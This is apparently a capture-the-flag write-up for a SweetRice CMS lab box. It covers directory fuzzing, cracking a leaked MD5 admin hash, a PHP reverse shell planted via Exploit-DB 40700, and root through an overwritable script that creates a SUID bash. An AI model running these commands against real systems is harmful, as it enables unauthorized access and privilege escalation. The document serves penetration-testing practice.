
# Foothold


```
kali@kali ~> ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.119.95:80/FUZZ

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.119.95:80/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 11321, Words: 3503, Lines: 376, Duration: 145ms]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 4620ms]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 4703ms]
.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 4620ms]
content                 [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 179ms]
index.html              [Status: 200, Size: 11321, Words: 3503, Lines: 376, Duration: 152ms]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 141ms]
:: Progress: [4614/4614] :: Job [1/1] :: 245 req/sec :: Duration: [0:00:24] :: Errors: 0 ::

```


```
kali@kali ~> ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.119.95:80/content/FUZZ

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.119.95:80/content/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 177ms]
_themes                 [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 168ms]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 6465ms]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 7481ms]
as                      [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 174ms]
attachment              [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 162ms]
images                  [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 216ms]
inc                     [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 241ms]
index.php               [Status: 200, Size: 2201, Words: 109, Lines: 36, Duration: 240ms]
js                      [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 154ms]
:: Progress: [4614/4614] :: Job [1/1] :: 136 req/sec :: Duration: [0:00:30] :: Errors: 0 ::

```



![[0 LazyRandal-20240315121444789.webp|494]]


Lets keep looking


![[0 LazyRandal-20240315121544682.webp|723]]


SQL backup looks pretty sus lets see what its about

```
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;',
  14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\
																					 ^^^^            ^^^^^^^^^         ^^^^^^^^^         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
																					Possible user    Username?         Attribute pass     Password hash!!!
"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');',
  15 => 'INSERT INTO `%--%_options` VALUES(\'2\',\'categories\',\'\',\'1575023409\');',
  16 => 'INSERT INTO `%--%_options` VALUES(\'3\',\'links\',\'\',\'1575023409\');',
```


lets crack it in crackstation
```
Hash	Type	Result
42f749ade7f9e195bf475f37a44cafcb	md5	Password123
```


now lets try login into the same web portal we saw


![[0 LazyRandal-20240315122107710.webp|634]]


It worked!, we see its version 1.5.1 and then we can move forward by lookin up vulnerabilities in that version


![[0 LazyRandal-20240315122249582.webp]]




The php arbirtrary file upload didnt work so i went ahead with the CSRF / PHP code exec one



https://www.exploit-db.com/exploits/40700

basically we can add php code into the ads section and it will be executed, so lets create a php rev shell in the ads and call it `test1`

we notice the location is 
http://localhost/sweetrice/inc/ads/hacked.php

But in our case we can see the path towards `/inc` is `http://10.10.119.95/content/inc/` so we have to adjust the path from `http://localhost/sweetrice/inc/ads/hacked.php` to `http://10.10.119.95/content/inc/ads/test1.php`

and boom 

--- 

# Priv Esc



```
www-data@THM-Chal:/home/itguy$ ls -la
ls -la
total 148
drwxr-xr-x 18 itguy itguy 4096 Nov 30  2019 .
drwxr-xr-x  3 root  root  4096 Nov 29  2019 ..
<...SNIP...>
drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Desktop
drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Documents
drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Downloads
drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Music
drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Pictures
drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Public
drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Templates
drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Videos
-rw-r--r-x  1 root  root    47 Nov 29  2019 backup.pl
-rw-r--r--  1 itguy itguy 8980 Nov 29  2019 examples.desktop
-rw-rw-r--  1 itguy itguy   16 Nov 29  2019 mysql_login.txt
-rw-rw-r--  1 itguy itguy   38 Nov 29  2019 user.txt

```



```
www-data@THM-Chal:/home/itguy$ sudo -l
sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```


```
www-data@THM-Chal:/home/itguy$ cat /home/itguy/backup.pl
cat /home/itguy/backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");

www-data@THM-Chal:/home/itguy$ cat /etc/copy.sh
cat /etc/copy.sh
echo "Hello World!"
```


so what can we do

```
www-data@THM-Chal:/home/itguy$ ls -la /home/itguy/backup.pl
ls -la /home/itguy/backup.pl
-rw-r--r-x 1 root root 47 Nov 29  2019 /home/itguy/backup.pl <----- cant do anything here just read and execute


www-data@THM-Chal:/home/itguy$ ls -la /etc/copy.sh
ls -la /etc/copy.sh
-rw-r--rwx 1 root root 45 Mar 15 10:55 /etc/copy.sh <----- can overwrite!!

```





```
www-data@THM-Chal:/tmp$ echo 'cp /bin/bash /tmp/test2; chmod +s /tmp/test2' > /etc/copy.sh
www-data@THM-Chal:/tmp$ sudo /usr/bin/perl /home/itguy/backup.pl
www-data@THM-Chal:/tmp$ cd /tmp
cd /tmp
www-data@THM-Chal:/tmp$ls -la
ls -la
total 2208
drwxrwxrwt  9 root     root        4096 Mar 15 10:56 .
drwxr-xr-x 23 root     root        4096 Nov 29  2019 ..
drwxrwxrwt  2 root     root        4096 Mar 15 10:01 .ICE-unix
drwxrwxrwt  2 root     root        4096 Mar 15 10:01 .Test-unix
-r--r--r--  1 root     root          11 Mar 15 10:03 .X0-lock
drwxrwxrwt  2 root     root        4096 Mar 15 10:03 .X11-unix
drwxrwxrwt  2 root     root        4096 Mar 15 10:01 .XIM-unix
drwxrwxrwt  2 root     root        4096 Mar 15 10:01 .font-unix
-rwsr-sr-x  1 www-data www-data 1109564 Mar 15 10:51 bash
prw-r--r--  1 root     root           0 Mar 15 10:44 f
drwx------  3 root     root        4096 Mar 15 10:04 systemd-private-9725292deef146aa89c9da69c2f53f0c-colord.service-bKWzfI
drwx------  3 root     root        4096 Mar 15 10:04 systemd-private-9725292deef146aa89c9da69c2f53f0c-rtkit-daemon.service-50qMfQ
-rwsr-sr-x  1 root     root     1109564 Mar 15 10:56 test2 <----------- our bash with the suid bit
www-data@THM-Chal:/tmp$ ./test2 -p
./test2 -p
id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
whoami
root
```





# Mistakes

**TOO FAST**

#### TOO FAST

### TOO FAST

## TOO FAST

# TOOOOOO FAAAASSSSSTTTTTTT


## Mistakes made in foothold



Didn't read the password here, just did ctrl+f pass and didn't see it infront of me and I didn't read everything properly like a retard

![[0 LazyRandal-20240315121954793.webp]]


```
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;',
  14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\
																					 ^^^^            ^^^^^^^^^         ^^^^^^^^^         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
																					Possible user    Username?         Attribute pass     Password hash!!!
"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');',
  15 => 'INSERT INTO `%--%_options` VALUES(\'2\',\'categories\',\'\',\'1575023409\');',
  16 => 'INSERT INTO `%--%_options` VALUES(\'3\',\'links\',\'\',\'1575023409\');',
```




https://www.exploit-db.com/exploits/40716 this one didnt work so try the other one

https://www.exploit-db.com/exploits/40700, dont rule it out because it *sounds off*
